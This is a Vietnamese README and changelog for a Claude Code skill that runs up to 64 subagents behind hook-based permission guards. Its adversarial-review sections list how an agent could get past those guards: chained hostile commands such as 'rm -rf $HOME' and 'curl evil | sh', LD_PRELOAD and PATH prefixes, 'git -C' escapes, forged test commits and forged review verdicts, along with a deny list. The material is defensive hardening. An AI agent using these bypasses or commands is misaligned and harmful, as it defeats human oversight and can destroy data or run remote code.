# dev-team v3.2 — event-driven, 64-wide, mọi loại task phát triển phần mềm

Skill Claude Code điều phối tối đa 64 subagent song song (programmer trong git worktree riêng,
reviewer / investigator / leader read-only), tối ưu cho **tốc độ wall-clock (10/10)** với chất
lượng giữ ở **8/10** bằng gate cơ học (hook + script) thay vì bằng lời dặn.

## Cài đặt (1 phút)

```
.claude/
  skills/dev-team/          ← copy nguyên thư mục này vào đây (hoặc ~/.claude/skills/dev-team)
    SKILL.md
    scripts/devteam.py      ← engine: scheduler / integrator / worktree helper (stdlib Python)
    scripts/guard.py        ← hook guards (footprint, frozen tests, refactor, permission, stop gate)
    agents/*.md             ← nguồn của 5 agent
  agents/                   ← doctor --fix sẽ cài 5 agent vào đây
```

Trong repo, chạy một lần (hoặc bỏ qua: `devteam.py start <plan.md>` tự chạy `doctor --fix` +
`init` + `dispatch` trong **một** lệnh):

```bash
python3 .claude/skills/dev-team/scripts/devteam.py doctor --fix
```

Lệnh này cài 5 agent (`programmer`, `code-reviewer`, `spot-reviewer`, `team-leader`,
`investigator`) vào `.claude/agents/` với hook trỏ đúng `guard.py`, ghi `.worktreeinclude`
(mang `.env*` vào mọi worktree mới), thêm git excludes, và ghi `.claude/settings.local.json`:

```json
{
  "env": {
    "CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS": "64",
    "CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY": "64",
    "CLAUDE_ASYNC_AGENT_STALL_TIMEOUT_MS": "1800000",
    "BASH_DEFAULT_TIMEOUT_MS": "600000",
    "BASH_MAX_TIMEOUT_MS": "1800000"
  },
  "subagentPromptCacheTtl": "1h",
  "worktree": { "baseRef": "head" },
  "permissions": { "allow": ["Bash(python3 <abs>/devteam.py:*)"] }
}
```

**Khởi động lại Claude Code** sau `--fix` lần đầu (env và agent mới chỉ áp dụng lúc start). Yêu cầu:
Claude Code ≥ 2.1.267 (từ bản này `effort:` trong frontmatter agent mới được tôn trọng), git ≥ 2.31,
python3. Không cài agent qua plugin (plugin bỏ qua `hooks`). Phải **trust đúng thư mục repo** (không
phải thư mục cha): hook trong frontmatter agent của repo chỉ được nạp khi chính thư mục đó được trust.
Muốn nhanh hơn nữa: gõ `/fast` (Opus fast mode, trừ usage credits) — Conductor và reviewer/leader
trên opus nhanh tới 2.5×; các lane programmer đã chạy sonnet/haiku.

## v3.2 thay đổi gì so với v3.1 (kiểm toán theo docs Claude Code 2.1.272, 9/2026)

Ba lỗi thật của v3.1 đã vá, rồi tối ưu tiếp critical path. Mỗi cơ chế có regression check
riêng trong `selftest.sh` (**247 check**, 183 → 247).

| v3.1 | v3.2 |
|---|---|
| Hook `PermissionRequest` đặt trong **frontmatter agent → không bao giờ chạy** (frontmatter chỉ hỗ trợ `PreToolUse`/`PostToolUse`/`Stop`), và schema output cũng sai. "Không treo vì prompt" chỉ là lời hứa | **`permissionMode: dontAsk` cho cả 5 agent** + hook `PreToolUse` trả `permissionDecision: allow` cho đúng tập an toàn: lệnh briefing đã ghim, git read-only, toolchain dự án (`npx/pytest/go/cargo/make…`), thao tác file **trong footprint** (`rm/mv/touch/mkdir/git add`), pipeline `… \| tail`, `cd <con> && …`. Ngoài tập đó → **bị từ chối ngay**, không bao giờ hỏi; agent dùng dạng đã ghim hoặc báo `Blocked`. Không bao giờ pre-approve: cài package (64 lane dùng chung `node_modules`), `python -c`/`node -e`/`bash -c`, redirect ra file, `;`/`&&`, `xargs`/`env`/`tee`/`docker`, `rm -r`, engine ngoài các helper commit. Hook allow được xử lý trước bước permission, nên trong phiên auto mode lệnh đã ghim thường **không phải chờ classifier** (bớt một model call mỗi tool call) |
| Guard read-only chặn team-leader ghi `plan.md` → **PLANNING mode hỏng** | Leader (nhận diện qua `agent_type` của hook input) được ghi `plan.md`; reviewer vẫn bị chặn. Nếu vẫn bị từ chối, leader trả cả plan trong reply để Conductor ghi |
| Conductor phải gõ `next <ids…>` — đọc thông báo, chép id | **Stop gate tự ghi marker** `.claude/dev-team/slices/<id>.done` (hoặc `.blocked` kèm đúng câu hỏi) → `devteam next` **không cần tham số**: tự gộp mọi lane đã xong, research có report, review, checkpoint. `.blocked` được in một lần dạng `BLOCKED S3: <câu hỏi>`. Marker giả vô hại: integrate kiểm lại toàn bộ |
| Block dispatch 7 dòng/agent; prompt 3 dòng | **1 dòng/agent**, prompt chỉ là lệnh `claim` (agent file dặn chạy nó đầu tiên) → output token của Conductor khi phóng 64 agent giảm ~50% — đây là critical path thật |
| "Resume không tốn slot" | Sai theo docs: resume **lấy slot mà không kiểm cap** → engine giữ chỗ cho review `CHANGES_REQUIRED` chưa re-review |
| Cache subagent mặc định 5 phút (chỉ frontmatter xin 1h) | `doctor --fix` ghi thêm `subagentPromptCacheTtl: "1h"`; cảnh báo nếu `CLAUDE_CODE_SUBAGENT_MODEL_FORCE=1` (nó vô hiệu hoá routing haiku/sonnet/opus) |
| `trivial` → haiku | thêm `docs` (không `large`) → haiku |
| Final review ≤ 8 shard × 12 file | ≤ 12 shard × 10 file |
| Dự án chưa có git → `init` lỗi | `start` tự `git init` + commit rỗng (greenfield) |
| Kết thúc phải tự viết tóm tắt | `finish` ghi `.claude/dev-team/summary.md` sẵn cho `gh pr create --body-file` |
| — | SKILL.md có bảng "Task → hình dạng pipeline" cho mọi loại việc: greenfield, migration/upgrade, codemod, security audit, DB migration, CI/IaC/deploy (apply prod chỉ do Conductor sau khi hỏi), perf, flaky test, UI, docs, thêm/bớt dependency, mở PR |

### Vòng review đối kháng v3.2 (một subagent độc lập tấn công allow-list mới)

7 lỗ tìm được, tất cả đã vá + có check hồi quy kèm đúng attack: `sort -o` / `find -fprint0|-fls`
(ghi file tuỳ ý dưới vỏ "filter"), tiền tố env `PATH=./x pytest` / `PYTHONPATH=` / `LD_PRELOAD=`
(đổi thứ được chạy → **không còn pre-approve bất kỳ lệnh có env prefix**, trừ dạng isolation đã ghim),
`npx <pkg chưa cài>` (tải + chạy từ registry → chỉ cho `npx` bin có sẵn trong `node_modules/.bin`),
`deno run <url>`, `python -m pip/venv`, `node --import/--require`, và vai read-only tái sử dụng cùng
allow-list (giờ reviewer chỉ chạy được runner: `pytest`/`go test`/`make test`…, không chạy script
trong repo). Thêm: report research nửa chừng không bị harvest (cần `## Verdict`/`## Findings`).

Những thứ đã cân nhắc và **không** đổi: Agent Teams (không resume, không worktree, experimental),
Workflow tool (không có shell để merge), `bypassPermissions` (không cần khi đã có dontAsk + allow),
fable cho leader (chậm hơn opus; để làm dial).

## v3 thay đổi gì so với v2.1

### 1. Vòng lặp không còn round-trip thừa — `next` tự thu hoạch

v2.1 mỗi lần thức dậy vẫn tốn thêm turn để báo cáo kết quả về engine: reviewer trả verdict →
`review-done` → đọc report → `add-fixes`; checkpoint chạy xong → `checkpoint --result pass`.
Mỗi lệnh đó là một round-trip nằm **thẳng trên critical path**.

v3: `next` đọc thẳng từ chính artifact mà agent đã ghi.

| Việc vừa xong | v2.1 | v3 |
|---|---|---|
| Reviewer ghi `rN.report.md` | Conductor đọc verdict → `review-done` → `add-fixes` (2–3 lệnh + 1–2 turn) | `next` parse `## Review verdict:`, ghi nhận verdict, xếp luôn fix slice từ block ```json (0 lệnh thêm) |
| Checkpoint chạy nền xong | Conductor dán kết quả → `checkpoint --result` | Lệnh checkpoint tự ghi `EXIT=$?` vào log; `next` đọc log, ghi pass/fail, in tail khi fail |
| team-leader VERIFICATION xong | `add-fixes verification.report.md` | `next` thu hoạch luôn |
| Investigator/research xong | (không có) | `integrate` ghi nhận report và xếp follow-up slice tự động |

Kết quả: một vòng review đầy đủ **không tốn turn nào ngoài turn launch agent**. Thu hoạch là
idempotent (gọi `next` hai lần không nhân đôi fix slice).

### 2. Profile thay cho thang `--fast` cộng dồn — mặc định `balanced`

Bốn núm độc lập thay vì một thang cứng, để mua tốc độ từng nấc thay vì bán cả gói:

| Profile | Gate mỗi slice | Chạy RED để xem fail | Review | Checkpoint |
|---|---|---|---|---|
| `strict` | lint+typecheck+build đầy đủ | mọi slice | theo batch | mỗi N merge |
| **`balanced`** (mặc định) | test của slice + lint/typecheck **chỉ trên file vừa đụng** | chỉ slice `risk: high` | theo batch | mỗi N merge |
| `turbo` | hoãn hết về 1 full gate cuối | không | 1 review cuối, sharded, spot | 1 lần cuối |
| `spike` | như turbo, **slice low-risk ship không test** | không | như turbo | 1 lần cuối |

`balanced` là mặc định vì hai thứ nó cắt gần như không mất assurance:

- **Gate scope theo file.** `lint_file` / `typecheck_file` chạy đúng trên file vừa sửa: 1 giây
  thay vì vài phút, nhân với 64 lane. Cùng một kiểm tra, chỉ khác phạm vi.
- **Bỏ lần chạy RED → thay bằng kiểm tra tĩnh.** `commit-red` **từ chối** file test không có
  assertion nào, hoặc có ít test case hơn số acceptance criteria. Đây chính là thứ mà một lần
  chạy RED bị bỏ sẽ để lọt, và nó chạy ở **mọi** profile (kể cả strict).
- Review theo batch vẫn giữ: nó chạy song song với build nên không tốn wall-clock.

`turbo`/`spike` **chỉ bật khi user yêu cầu**. `--fast N` cũ vẫn nhận (0→strict, 1|2|3→turbo, 4→spike).

### 3. `kind` cho slice — một pipeline, mọi loại task phát triển phần mềm

v2.1 chỉ làm được task "viết code mới theo test-first". v3 mỗi slice khai `kind`, engine đổi
đúng pipeline và đúng bằng chứng cơ học:

| `kind` | Pipeline | Bằng chứng cơ học thay cho RED/GREEN |
|---|---|---|
| `code` (mặc định) | RED → GREEN | commit test trước, test đóng băng |
| `test` | 1 commit | **bắt buộc** thực sự thêm file test (hook + merge đều kiểm) |
| `refactor` | 1 commit | **cấm tuyệt đối đụng vào bất kỳ file test nào** — hook chặn edit, `commit-work` khôi phục, `integrate` reject. Test không đổi chính là bằng chứng hành vi không đổi. Report phải có cả run trước và sau |
| `chore` | 1 commit | output của lệnh `verify` riêng của slice |
| `docs` | 1 commit | như trên |
| `perf` | 1 commit | số đo **trước và sau** |
| `research` | read-only | report file; không merge gì; fix slice trong report được xếp hàng tự động |

Nhờ đó dev-team phủ: feature, bug fix, refactor/codemod, migration/upgrade, backfill test,
tối ưu hiệu năng, CI/build/infra/config, tài liệu, và nghiên cứu khả thi — vẫn cùng một
scheduler, cùng worktree, cùng cơ chế merge.

### 4. Route theo loại yêu cầu (không phải task nào cũng cần plan)

| Yêu cầu | Route |
|---|---|
| Câu hỏi về code | `Explore` song song, trả lời, không dùng engine |
| Bug chưa rõ nguyên nhân | `devteam brief-debug "<triệu chứng>" -n 4` → 4 investigator đọc-only, mỗi con một góc (thay đổi gần đây / data path / môi trường & config / state & concurrency / dependency / reproduce). Con nào `ROOT CAUSE FOUND` trước thì thắng |
| "Review PR này" | `devteam review-pr <range> --shards N` → fan reviewer trên diff, **không cần plan, không cần programmer** |
| Còn lại | pipeline với `kind` phù hợp |

### 5. Lập lịch & định tuyến model

- **Critical path tính theo khối lượng, không theo số chặng.** `size` (`trivial`/`small`/`large`
  → trọng số 1/3/8) là trọng số; engine khởi động chuỗi *nặng* nhất trước (LPT), nên một chuỗi
  3 slice vặt không còn chen trước một slice lớn.
- **Slice `trivial` được dispatch với `model: haiku`** (Agent tool hỗ trợ override model theo
  từng lời gọi, và giữ nguyên model đó khi resume). Gate cơ học bắt lỗi mà model nhỏ mắc phải.

### 6. Sửa theo tài liệu Claude Code hiện hành (9/2026)

| v2.1 | v3 |
|---|---|
| `doctor` ghi `worktree.symlinkDirectories` — **setting này không tồn tại** | bỏ; dùng `.worktreeinclude` (cơ chế chính thức, copy file gitignored như `.env`) + `claim` tự symlink `node_modules`/`.venv`/… (copy `node_modules` sẽ rất chậm nên không dùng `.worktreeinclude` cho nó) |
| Không set timeout | set `CLAUDE_ASYNC_AGENT_STALL_TIMEOUT_MS` (mặc định 10 phút — subagent chạy test lâu bị giết giữa chừng) và `BASH_DEFAULT_TIMEOUT_MS`/`BASH_MAX_TIMEOUT_MS` (mặc định 2/10 phút) |
| Review ở fast level 3 in `model: sonnet` trong block Agent | agent riêng `spot-reviewer` (sonnet, checklist correctness/security) — prompt ngắn hơn, cache tốt hơn |
| Agent nền gặp permission prompt thì treo | thêm hook `PermissionRequest` (`guard.py perm`): tự allow **đúng** những lệnh briefing đã ghim (`.slice/allow`) + git read-only; mọi thứ khác giữ nguyên luồng bình thường; không bao giờ nới lỏng thứ `guard.py bash` đã cấm |
| — | mọi agent khai `experimental.cacheTtl: 1h` → prompt cache 1 giờ, đúng thứ làm warm resume rẻ sau hàng giờ chạy |
| — | `devteam probe` tự dò lệnh build/test/lint/typecheck từ package.json / pyproject / go.mod / Cargo.toml / pom.xml / Gradle / Gemfile / Makefile, và đề xuất dạng `{files}` |

## Vòng đời một run (Conductor)

```
start plan.md   →   [wake-up: next]*   →   next (DAG cạn: tự chạy final review + full-gate checkpoint)
                                                  → next (thu hoạch verdict + fix) → … → finish
```

Mỗi lần thức dậy: **một** lệnh `next` (không tham số) → launch mọi Agent call nó in ra → kết
thúc turn. Không `review-done`, không `add-fixes`, không `checkpoint --result`, không chép id trên
happy path.
Các lệnh lẻ (`init`, `dispatch`, `integrate`, `review-batch`, `checkpoint`, `retry`, `bind`,
`add-fix`) vẫn còn nguyên cho tình huống lệch luồng.

## Đã kiểm thử

`bash scripts/selftest.sh` — **247 check**, dựng repo git tạm và đi hết vòng đời. Ngoài toàn bộ
check của v2.1 (init/validate, ready-set tách rời đôi một, cap slot, allow-rule, symlink
node_modules, high-risk RED→GREEN, reject khi sửa test đóng băng / ra ngoài footprint, merge với
gpgsign+hook tắt, checkpoint snapshot detached, review shard, add-fixes, retry nạp lại plan.md,
5 chế độ hook với JSON stdin thật, doctor pin hook, đường dẫn có dấu cách), v3 thêm:

- profile: mặc định `balanced`; gate theo file vs gate đầy đủ vs hoãn; `strict` giữ RED run mọi
  slice; `balanced` giữ RED run cho slice high-risk và bỏ cho low-risk; `--fast` cũ vẫn map đúng
- vacuous-test guard: từ chối test không assertion, từ chối file không khai test case nào,
  không commit gì khi bị từ chối, `--force` là đường thoát có ghi nhận
- 7 `kind`: dispatch đúng agent/mode, briefing đúng, refactor bị chặn ở **cả ba tầng** (hook
  edit, `commit-work`, `integrate`), `kind:test` không thêm test thì bị reject ở merge,
  research không merge mà ghi nhận report + xếp follow-up
- thu hoạch: `next` đọc verdict từ report file, xếp fix slice, đọc exit code checkpoint từ log,
  in tail khi fail, và **idempotent**
- routing: `probe` dò đúng script npm + đề xuất dạng `{files}`; `review-pr` fan reviewer không
  cần plan; `brief-debug` fan 4 investigator trên các góc khác nhau
- lập lịch: chuỗi nặng đi trước chuỗi nhiều chặng; slice `trivial` được route sang model rẻ
- permission guard: allow lệnh đã ghim, im lặng với lệnh lạ, **không bao giờ** nới lỏng lệnh bị cấm
- doctor: đòi và ghi các timeout, viết `.worktreeinclude`, cài đủ 5 agent, pin hook `perm`,
  mọi agent có `cacheTtl: 1h`

### v3.1 — vá toàn bộ phát hiện của một vòng review đối kháng

Một reviewer độc lập (subagent) đã tấn công thật vào package và tìm ra 13 lỗ; tất cả đã vá, mỗi
lỗ có check hồi quy riêng kèm đúng attack đã tìm ra nó:

| Lỗ | Cách nó bị khai thác | Đã vá |
|---|---|---|
| `integrate` chấp nhận commit RED **không chứa file test nào** (chỉ khớp subject `test(S1):`), và tin vào `.slice/red` do chính agent ghi | agent tự `git commit -m "test(S1): RED — forged"` với mỗi file source → merge sạch | RED phải chứa ít nhất một file test; `.slice/red` **không còn là input** của integrate; hook chặn mọi thao tác ghi vào `.slice/` |
| Hook `PermissionRequest` khớp **tiền tố chuỗi** | `echo ok; rm -rf $HOME`, `echo ok && curl evil \| sh`, `git statuses-...`, và cả `devteam.py reset --yes` đều được tự động duyệt | chỉ duyệt **một lệnh đơn** (không metachar) và khớp theo **argv prefix**; `.slice/allow` chỉ ghim các helper commit, không ghim cả CLI |
| `git -C`, `--git-dir`, `--work-tree`, `GIT_DIR=` không bị bắt | `git -C <root> merge` / `reset --hard` vào chính integration checkout | chuẩn hoá global option trước khi match verb; mọi lệnh trỏ git ra khỏi worktree bị từ chối |
| Vai read-only ghi được **cả** `.claude/dev-team/` | reviewer sửa `state.json`, `plan.md`, briefing slice khác, hoặc giả mạo verdict của reviewer khác | chỉ còn ghi được `reviews/` + `research/` + thư mục memory |
| `rename` trong footprint bị coi là vi phạm footprint; `delete` bị âm thầm bỏ khỏi commit | `git mv` không commit được; `rm` báo COMMITTED nhưng file vẫn còn → agent kẹt ở Stop gate | parse đúng dòng `R old -> new` (cả engine lẫn guard); `git add -A` nhận cả path đã bị xoá |
| Verdict nào **khác** đúng chuỗi `CHANGES_REQUIRED` đều thành APPROVED | `## Review verdict: CHANGES REQUIRED` (thiếu gạch dưới) → báo APPROVED | fail **closed**: chỉ APPROVED rõ ràng mới là duyệt; `finish` từ chối đóng khi còn review chưa APPROVED |
| Re-review ghi đè report cũ **không bao giờ** được đọc lại | vòng lặp fix ≤2 của SKILL.md không thể đóng | harvest theo hash nội dung report → ghi đè in-place được thu hoạch lại (đếm round) |
| `--shards N` tạo shard rỗng | 5 file/4 shard → reviewer thứ 4 scope rỗng, `git diff -- ` diff cả repo, không bao giờ report → review treo vĩnh viễn + 4 slot bị giữ | bỏ shard rỗng, lưu số shard thực sự dispatch |
| Fix slice lấy từ report do agent viết không qua validation nào | `"files":["*"]` → vô hiệu hoá mọi footprint check **và** serialize cả run; `"files":"src/a.js"` → tách thành từng ký tự; `kind:chore` không `verify` → merge không cần bằng chứng gì | validate: files phải là list path, cấm wildcard, cấm >40 path, chore/docs/perf không có `verify` bị hạ xuống `code` (test-first) |
| Kiểm tra vacuous-test nhận **từ trần** `require` / `should` / `verify` | file test không có assertion nào nhưng có dòng `require('../src/foo')` → lọt | chỉ nhận assertion **dạng lời gọi**; `describe(` không còn được đếm là test case |
| `--fast 0` bị bỏ qua (0 là falsy) | người dùng gõ cờ "assurance cao nhất" lại nhận profile thấp nhất | `--fast` default `None` |
| `doctor --fix` không bao giờ cập nhật agent đã cài | nâng cấp v2.1 → v3 giữ nguyên `programmer.md` cũ (không có hook `PermissionRequest`, không có cache 1h, không biết mode WORK) | so sánh nội dung với bản trong skill, cài lại và giữ `.bak` |
| `claim` lại trên worktree GREEN `reset --hard` đè lên commit đã có | agent mất việc đã làm khi `.slice/` biến mất | giữ lại commit đã nằm trên base, chỉ cảnh báo |

Mỗi bảo đảm mới đều được **mutation test**: cố tình phá từng cơ chế → đúng check tương ứng phải
đỏ. Chưa chạy bên trong một phiên Claude Code thật — hãy thử trên một task nhỏ trước khi mở 64 luồng.

## Dial khi cần chỉnh

- Plan: `profile`, `review_batch` (mặc định 8), `checkpoint_every` (8), `test_globs`, `dep_dirs`,
  và **`commands.lint_file` / `typecheck_file`** (quan trọng nhất cho tốc độ ở profile balanced).
- Slice: `kind`, `size`, `risk`, `isolation`, `verify`, `model` (override thủ công).
- `agents/programmer.md`: `effort: medium` → `low` cho việc boilerplate; `maxTurns`.
- `agents/team-leader.md`: `model: fable` nếu tài khoản có; `effort: xhigh` cho plan rất lớn.
- Agent Teams (experimental) và Workflow tool không dùng làm mặc định: teams không resume được,
  workflow giới hạn 16 agent đồng thời và không có shell để merge.
